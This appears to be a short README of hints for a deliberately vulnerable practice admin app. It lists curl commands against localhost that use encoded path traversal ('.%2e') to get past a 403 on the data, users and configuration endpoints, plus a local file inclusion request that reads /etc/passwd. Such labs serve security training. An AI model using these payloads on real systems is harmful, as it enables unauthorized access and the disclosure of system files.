# Getting Started

### Tips for admin app
- login page always will `Username or password is incorrect` return 
- 403 - `curl http://localhost/admin/123/.%2e/data` (data, help, password endpoints)
- Path traversal - `curl http://localhost/admin/123/.%2e/users`
- Path traversal - `curl http://localhost/admin/123/.%2e/configuration`
- LFI - `curl http://localhost/admin/123/.%2e/configuration?file=/../../../../../../../etc/passwd`